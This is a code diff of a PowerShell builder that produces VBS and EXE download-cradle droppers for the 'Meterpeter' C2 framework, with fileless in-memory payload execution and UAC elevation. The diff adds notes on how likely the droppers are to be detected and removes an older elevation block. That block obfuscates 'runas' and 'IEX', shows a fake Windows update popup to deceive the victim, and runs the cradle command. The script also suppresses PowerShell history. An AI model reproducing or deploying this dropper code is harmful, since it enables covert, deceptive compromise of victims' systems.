@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: .NET\Framework\v4.0.30319\vbc.exe
-   PS cmdlet Dev version: v1.2.20
+   PS cmdlet Dev version: v1.2.21
 
 .DESCRIPTION
    Cmdlet to create download_crandle.vbs that allows Meterpeter C2 v2.10.14
@@ -25,7 +25,8 @@
    with payload FileLess (ram) technic execution ( payload does not touch disk )
 
    Remark: compile function does not add [U]AC elevation function to dropper,
-   and only creates droppers using payload fileless technics 3 or 4 (ram exec)
+   and only creates droppers using payload fileless technics 3 or 4 (ram) and is
+   changes of beeing detected while download it using target browser are greatter
 
    If invoked -UACElevation 'true' then cmdlet creates Download_crandle.vbs
    with UAC elevation function, If invoked -UACElevation 'false' then cmdlet
@@ -76,8 +77,9 @@
    creates 'Download_crandle.vbs' (FileLess payload exec technic 2)
 
 .EXAMPLE
-   PS C:\> .\crandle_builder.ps1 -action 'compile' -Egg 'false'
+   PS C:\> .\crandle_builder.ps1 -action 'compile' -egg 'false'
    creates 'Download_crandle.exe' (FileLess payload exec technic 4)
+   changes of beeing detected while browser downloading are higher
 
 .INPUTS
    None. You cannot pipe objects into crandle_builder.ps1
@@ -126,7 +128,6 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Rand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $Apii = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
 $gUid = -join ((65..90) + (97..122) | Get-Random -Count $StrLength | % {[char]$_}) # Only Random letters!
-$TokenAuth = Get-Random -Minimum 900 -Maximum 1300
 $SCNa = "$PayloadName" -replace '.ps1','.vbs'
 
 write-host ""
@@ -246,7 +247,7 @@ CreateObject(`"wscript.shell`").run `"cmd /R echo Y|Powershell Set-ExecutionPoli
 WScript.Quit")
 
 
-<#
+<# OLD [U]AC elevation technic
 $AutoElevation = @("dIm cookie,Authtoken
 Microsoft = StrReverse(`"sanur`")
 
@@ -409,30 +410,6 @@ Next
 WScript.Quit")
 #>
 
-
-<# Old elevation way
-$AutoElevation = @("dIm reverse
-reverse = StrReverse(`"sanur`") 
-' test if administrator privileges
-Set nero = CreateObject(`"Shell.Application`")
-If Not WScript.Arguments.Named.Exists(`"debug`") Then
-  nero.ShellExecute WScript.FullName _
-  , `"`"`"`" & WScript.ScriptFullName & `"`"`" /debug`", `"`", reverse, 1
-  WScript.Quit
-End If
-
-dIm $Apii,Cmd,Layback,fdx,ttl
-ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
-$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
-
-set ObjConsole = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
-ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
-ObjConsole.Exec(`"$CrandleCmdLine`")
-}")
-#>
-
 }
 ElseIf($Action -ieq "Compile")
 {
@@ -445,7 +422,8 @@ ElseIf($Action -ieq "Compile")
 .NOTES
    This vbs function only uses fileless technics 3 and 4.
    If invoked -action 'compile' together with -egg 'false'
-   this function will compile dropper.vbs to dropper.exe
+   this function will compile dropper.vbs to dropper.exe and is
+   changes of beeing detected while browser downloading are higher
 #>
 
 
